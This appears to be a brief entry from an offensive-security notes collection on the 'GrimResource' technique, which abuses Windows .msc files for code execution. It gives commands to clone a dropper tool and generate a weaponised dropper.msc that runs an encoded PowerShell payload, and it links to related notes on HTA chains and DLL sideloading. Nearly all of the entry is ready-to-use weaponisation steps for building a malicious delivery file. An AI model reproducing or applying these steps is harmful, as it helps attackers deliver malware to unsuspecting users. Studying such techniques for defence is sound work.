## MSC Dropper (GrimResource)

Exploits `.msc` files for code execution. Uses a template MSC to embed a payload command.

```sh
# Install
git clone https://github.com/ZERODETECTION/MSC_Dropper

# Generate
python3 msc_dropper.py template1.msc dropper.msc "powershell -EncodedCommand <BASE64_PAYLOAD>"
```

> Reference: https://www.elastic.co/security-labs/grimresource

---

> See also: [[2. Weaponisation & Delivery/HTA Chains]], [[2. Weaponisation & Delivery/DLL Sideloading]]
